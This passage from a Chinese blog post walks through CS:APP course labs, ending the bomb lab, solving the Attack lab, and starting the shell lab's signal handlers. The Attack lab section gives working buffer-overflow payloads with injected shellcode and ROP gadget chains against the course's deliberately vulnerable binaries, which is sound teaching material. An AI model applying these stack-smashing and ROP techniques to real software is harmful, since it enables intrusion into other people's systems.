src="https://i.loli.net/2021/02/13/M4T5PW91HNu36gq.png" alt="image-20210213013030596"></p><p>然后就是<img src="https://i.loli.net/2021/02/13/3PAHDEIaq6fThRS.png" alt="image-20210213022121426"></p><p>可以得到d8存e0，e8存f0……20存0</p><p><img src="https://i.loli.net/2021/02/13/hXBq2IpPzUCyRkc.png" alt="image-20210213030646430"></p><p>根据前面的332 168 924等进行排序，然后算出答案应该是4 3 2 1 6 5</p><p><img src="https://i.loli.net/2021/02/13/6TXHwAyGuqd1LPe.png" alt="image-20210213030945318"></p><p>然后就做完了</p><p>备注：这个做的有些吃力，做完了看别人blog发现这原来是个链表…</p><h1 id="0x02-Attack-lab"><a href="#0x02-Attack-lab" class="headerlink" title="0x02 Attack lab"></a>0x02 Attack lab</h1><p>这个题要先去看看他的要求：<a href="http://csapp.cs.cmu.edu/3e/README-attacklab">http://csapp.cs.cmu.edu/3e/README-attacklab</a></p><p><a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">http://csapp.cs.cmu.edu/3e/attacklab.pdf</a></p><p>这个lab给了这些程序</p><p><img src="https://i.loli.net/2021/02/13/kOKdeBwWhsn9vcb.png" alt="image-20210213153141963"></p><p>另外执行程序时要加入参数<code>-q</code>，否则会报错</p><p><img src="https://i.loli.net/2021/02/13/GXNmEAOgJYZW53R.png" alt="image-20210213161230555"></p><h2 id="code-injection"><a href="#code-injection" class="headerlink" title="code-injection"></a>code-injection</h2><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>第一题是让你执行getbuf()时，调用touch1的代码</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    val = <span class="built_in">getbuf</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line"><span class="built_in">validate</span>(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line"><span class="built_in">Gets</span>(buf);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>touch1函数的地址是<code>00000000004017c0</code>，这里要使用小端法写入程序，所以是<code>c017400000000000</code></p><p>test函数的反汇编</p><p><img src="https://i.loli.net/2021/02/13/rAPcQM47szVLR6X.png" alt="image-20210213184918397"></p><p>这个题的关键点在于覆盖getbuf函数的返回地址，可以看到getbuf的缓冲区大小为0x28</p><p><img src="https://i.loli.net/2021/02/13/l5UQRMDaersSO7A.png" alt="image-20210213185013392"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">c0 17 40 00</span><br><span class="line">00 00 00 00</span><br></pre></td></tr></table></figure><p>调用成功</p><p><img src="https://i.loli.net/2021/02/13/P857rftXoOv3JgC.png" alt="image-20210213190903671"></p><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>这题要求执行touch2，并且传入参数（你的cookie）</p><p><img src="https://i.loli.net/2021/02/13/Vo83wklzHgfAu4Y.png" alt="image-20210213201612283"></p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">vlevel = <span class="number">2</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line"><span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line"><span class="built_in">validate</span>(<span class="number">2</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line"><span class="built_in">fail</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先找到touch2的地址<code>4017ec</code>，因为我们的cookie是<code>0x59b997fa</code>，所以传值为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59</span><br><span class="line">68 ec 17 40 00</span><br><span class="line">c3</span><br><span class="line">00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure><p>成功</p><p><img src="https://i.loli.net/2021/02/13/wP8rWtgxem4DoUK.png" alt="image-20210213235902768"></p><p>然后解释一下前面那些奇怪的字符是什么意思(之所以使用ret到是因为限制了不能用jmp)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov 0x59b997fa, %rdi</span><br><span class="line">push 004017ec</span><br><span class="line">ret</span><br><span class="line">;最后一串是返回地址</span><br></pre></td></tr></table></figure><p>最后的返回地址是如何得到的:</p><p><img src="https://i.loli.net/2021/02/14/2pr8yb46U1oMzce.png" alt="image-20210214001024676"></p><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p><img src="https://i.loli.net/2021/02/19/oL5e3ucmpF7O12K.png" alt="image-20210219221214594"></p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line"><span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line"><span class="keyword">char</span> *s = cbuf + <span class="built_in">random</span>() % <span class="number">100</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">hexmatch</span>(cookie, sval)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line"><span class="built_in">validate</span>(<span class="number">3</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line"><span class="built_in">fail</span>(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三题让你传入的变成了cookie的地址，解决方式和第二题没有区别</p><p><img src="https://i.loli.net/2021/02/20/2np5BQzfFmtq9dW.png" alt="image-20210220014449554"></p><p>记得把cookie的值变成ascii码形式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">35 39 62 39 39 37 66 61 00</span><br><span class="line">48 c7 c7 78 dc 61 55</span><br><span class="line">68 fa 18 40 00</span><br><span class="line">c3</span><br><span class="line">00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00</span><br><span class="line">81 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure><p>第一行是cookie，第二行之后是汇编，最后一行是存着汇编的栈的返回地址。</p><p><img src="https://i.loli.net/2021/02/20/1v2QcSX4x5AKhRj.png" alt="image-20210220013408873"></p><h2 id="return-oriented-programming"><a href="#return-oriented-programming" class="headerlink" title="return-oriented programming"></a>return-oriented programming</h2><p>这两道题用了栈随机化（ASLR）和限制可执行代码区域（加入NX位，注入进栈中的代码无法被程序执行）</p><p><strong>ROP攻击就是利用函数自带的gadgets（就是现成的代码）构成一个攻击链，它借用代码段里面的多个retq前的一段指令拼凑成一段有效的逻辑，从而达到攻击的目标。为什么是retq呢，因为retq指令返回到哪里执行，由栈的内容决定，这是攻击者很容易控制的地方。</strong></p><p><img src="https://i.loli.net/2021/02/20/f1P2OGLspQgZndj.png" alt="image-20210220110756552"></p><h3 id="level2-1"><a href="#level2-1" class="headerlink" title="level2"></a>level2</h3><p>和上题一样，我们需要做的就是赋值%rdi为<code>0x59b997fa</code>，然后跳到touch2的地址。</p><p>因为gadgets不可能有<code>mov 0x59b997fa, %rdi</code>，所以我们把cookie的值存到栈中，然后pop到%rdi即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5f    pop %rdi</span><br><span class="line">c3    retq</span><br></pre></td></tr></table></figure><p>然后找到对应的机器码，这个地址是40141b。</p><p><img src="https://i.loli.net/2021/02/20/w2hAudYptHo53E1.png" alt="image-20210220120258423"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">1b 14 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/20/M6jI1selTOvJimZ.png" alt="image-20210220122558444"></p><p>对照此图思考一下即可</p><p><img src="https://i.loli.net/2021/02/20/RSnVW7uvNrmwoyC.png" alt="image-20210220120705529"></p><h3 id="level3-1"><a href="#level3-1" class="headerlink" title="level3"></a>level3</h3><p>这道题也是同样的思路，不过因为栈随机化，所以不能直接用栈的地址。</p><p>首先把%rsp的地址传送到%rdi，然后获取字符串的偏移传送到%rsi，<code>lea (%rdi,%rsi,1), %rax</code>， 将字符串的首地址传送到%rax，再传送到%rdi，最后调用touch3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#栈中的场景</span><br><span class="line">0x28の栈帧</span><br><span class="line">mov rsp, rax   --返回地址</span><br><span class="line">mov rax, rdi</span><br><span class="line">pop rax</span><br><span class="line">偏移0x48</span><br><span class="line">mov rax, rdx</span><br><span class="line">mov rdx, rcx</span><br><span class="line">mov rcx, rsi</span><br><span class="line">lea (rdi,rsi,1), rax</span><br><span class="line">mov rax, rdi</span><br><span class="line">touch3</span><br><span class="line">cookie</span><br></pre></td></tr></table></figure><p>要注意这全是拼出来的，rop主要的攻击方式就是拼，如果你想到了更好的方式，但是找不到机器码也是没用的。</p><p>首先把rsp的地址放到rax里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 89 e0                mov    %rsp,%rax</span><br><span class="line">   3:   c3                      retq</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/20/fgm1RztLdJU4BCO.png" alt="image-20210220124307596"></p><p>然后把栈的地址放到rdi里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">48 89 c7    mov %rax,%rdi</span><br><span class="line">c3          retq</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/20/gsvcxdtUiR1pylB.png" alt="image-20210220124606596"></p><p>以此类推，最后输入的数据如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">06 1a 40 00 00 00 00 00 </span><br><span class="line">a2 19 40 00 00 00 00 00 </span><br><span class="line">cc 19 40 00 00 00 00 00 </span><br><span class="line">48 00 00 00 00 00 00 00 </span><br><span class="line">dd 19 40 00 00 00 00 00 </span><br><span class="line">70 1a 40 00 00 00 00 00 </span><br><span class="line">13 1a 40 00 00 00 00 00 </span><br><span class="line">d6 19 40 00 00 00 00 00 </span><br><span class="line">a2 19 40 00 00 00 00 00 </span><br><span class="line">fa 18 40 00 00 00 00 00 </span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/20/n9UTRH1XCb7KQmi.png" alt="image-20210220142055331"></p><h1 id="0x03-shell-lab"><a href="#0x03-shell-lab" class="headerlink" title="0x03 shell lab"></a>0x03 shell lab</h1><p>激动人心，终于可以开始写代码了。</p><p>如果shell lab不会写，就是因为书没仔细看。不过也没必要回去再看书，按照shell lab补充没细看的知识即可。</p><p>写之前看看：<a href="http://csapp.cs.cmu.edu/3e/shlab.pdf">http://csapp.cs.cmu.edu/3e/shlab.pdf</a></p><p>本实验需要实现一个unix shell，我们需要完善tsh.c的代码，写出7个函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">• eval: 解析和解释命令行的主例程。 [70行]</span><br><span class="line">• builtin cmd: 识别并解释内置命令：quit，fg，bg和job。 [25行]</span><br><span class="line">• do bgfg: 实现bg和fg内置命令。 [50行]</span><br><span class="line">• waitfg: 等待前台作业的完成。[20行]</span><br><span class="line">• sigchld handler: 捕获SIGCHILD信号。80行]</span><br><span class="line">• sigint handler: 捕获SIGINT（ctrl-c）信号。[15行]</span><br><span class="line">• sigtstp handler: 捕获SIGTSTP（ctrl-z）信号。[15行]</span><br></pre></td></tr></table></figure><p>首先我们要知道的事情：</p><blockquote><ol><li>shell的第一个参数是内置命令的名称或可执行文件的路径。剩下的单词是命令行参数。</li><li>当是可执行文件路径名的时候，shell会开启一个子进程，然后在子进程的上下文中加载运行程序。</li><li>如果shell以&amp;结束，那么shell将在后台运行，这意味着shell在打印提示符和等待下一条命令行之前不会等待作业的终结。</li><li>最多只能有一个作业在前台运行。</li><li>tsh不需要支持管道符和重定向</li><li>ctrl+c（ctrl+z）会导致前台信号关闭</li><li>每个job都可以通过pid和jid（job id）来识别</li><li>tsh支持的内置指令：</li></ol><ul><li>quit：退出当前shell</li><li>jobs：列出所有后台job</li><li>bg&lt;job&gt;：通过发送SIGCONT信号重启&lt;job&gt;</li><li>fg&lt;job&gt;：通过发送SIGCONT信号重启&lt;job&gt;</li></ul></blockquote><p>在写之前建议先看看8.4.6的shell简易实现。</p><p>我们首先分析一下它给我们的main函数</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">char</span> cmdline[MAXLINE];</span><br><span class="line">    <span class="keyword">int</span> emit_prompt = <span class="number">1</span>; <span class="comment">/* 发出提示 (default) */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 将stderr重定向到stdout（这样，驱动程序将在连接到stdout的管道上获得所有输出） */</span></span><br><span class="line">    <span class="built_in">dup2</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 解析命令行 */</span></span><br><span class="line">    <span class="keyword">while</span> ((c = <span class="built_in">getopt</span>(argc, argv, <span class="string">&quot;hvp&quot;</span>)) != EOF) &#123;</span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span> (c) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:             <span class="comment">/* print help message */</span></span><br><span class="line">            <span class="built_in">usage</span>();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:             <span class="comment">/* 发出额外的诊断信息 */</span></span><br><span class="line">            verbose = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:             <span class="comment">/* 不打印提示 */</span></span><br><span class="line">            emit_prompt = <span class="number">0</span>;  <span class="comment">/* 便于自动检测 */</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">usage</span>();</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 下面这三个信号需要我们自己实现 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">Signal</span>(SIGINT,  sigint_handler);   <span class="comment">/* ctrl-c 来自键盘的中断*/</span></span><br><span class="line">    <span class="built_in">Signal</span>(SIGTSTP, sigtstp_handler);  <span class="comment">/* ctrl-z 来自终端的中断*/</span></span><br><span class="line">    <span class="built_in">Signal</span>(SIGCHLD, sigchld_handler);  <span class="comment">/* 一个子进程停止或者终止 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">Signal</span>(SIGQUIT, sigquit_handler);  <span class="comment">/* 来自键盘的退出 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 初始化job列表 */</span></span><br><span class="line">    <span class="built_in">initjobs</span>(jobs);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 执行shell循环 */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 读取命令行列表 */</span></span><br><span class="line"><span class="keyword">if</span> (emit_prompt) &#123;                  <span class="comment">/* 是否输出提示 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, prompt);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((<span class="built_in">fgets</span>(cmdline, MAXLINE, stdin) == <span class="literal">NULL</span>) &amp;&amp; <span class="built_in">ferror</span>(stdin))</span><br><span class="line">    <span class="built_in">app_error</span>(<span class="string">&quot;fgets error&quot;</span>);       <span class="comment">/* 命令行读取为空 */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">feof</span>(stdin)) &#123;                  <span class="comment">/* End of file (ctrl-d) */</span></span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Evaluate the command line */</span></span><br><span class="line"><span class="built_in">eval</span>(cmdline);</span><br><span class="line"><span class="built_in">fflush</span>(stdout);</span><br><span class="line"><span class="built_in">fflush</span>(stdout);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">/* control never reaches here */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们先把几个简单的信号写完</p><blockquote><p>首先是ctrl c终止前台作业</p></blockquote><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;<span class="comment">/* 见p536 G2 保存和恢复error */</span></span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, mask_prev;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">sigfillset</span>(&amp;mask_all);<span class="comment">/* 见p536 G3 阻塞所有信号 */</span></span><br><span class="line">    <span class="built_in">sigprocmask</span>(SIG_BLOCK, &amp;mask_all, &amp;mask_prev);</span><br><span class="line">    pid = <span class="built_in">fgpid</span>(jobs);<span class="comment">/* 返回当前前台job的PID，如果没有此job，返回0 */</span></span><br><span class="line">    <span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;mask_prev, <span class="literal">NULL</span>); </span><br><span class="line">    <span class="keyword">if</span>(pid != <span class="number">0</span>)&#123;<span class="comment">/* 如果前台job存活，就kill掉 */</span></span><br><span class="line">        <span class="built_in">kill</span>(-pid, SIGINT);</span><br><span class="line">    &#125;</span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>然后是ctrl z中断任务的执行，但该任务并没有结束，它只是在进程中维持挂起的状态</p><p>代码和上面的一样，改个信号就行</p></blockquote><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;<span class="comment">/* 见p536 G2 保存和恢复error */</span></span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, mask_prev;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">sigfillset</span>(&amp;mask_all);<span class="comment">/* 见p536 G3 阻塞所有信号 */</span></span><br><span class="line">    <span class="built_in">sigprocmask</span>(SIG_BLOCK, &amp;mask_all, &amp;mask_prev);</span><br><span class="line">    pid = <span class="built_in">fgpid</span>(jobs);<span class="comment">/* 返回当前前台job的PID，如果没有此job，返回0 */</span></span><br><span class="line">    <span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;mask_prev, <span class="literal">NULL</span>); </span><br><span class="line">    <span class="keyword">if</span>(pid != <span class="number">0</span>)&#123;<span class="comment">/* 如果前台job存活，就kill掉 */</span></span><br><span class="line">        <span class="built_in">kill</span>(-pid, SIGTSTP);</span><br><span class="line">    &#125;</span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>然后写waitfg</p></blockquote><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">while</span>(pid==<span class="built_in">fgpid</span>(jobs))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">sleep</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span 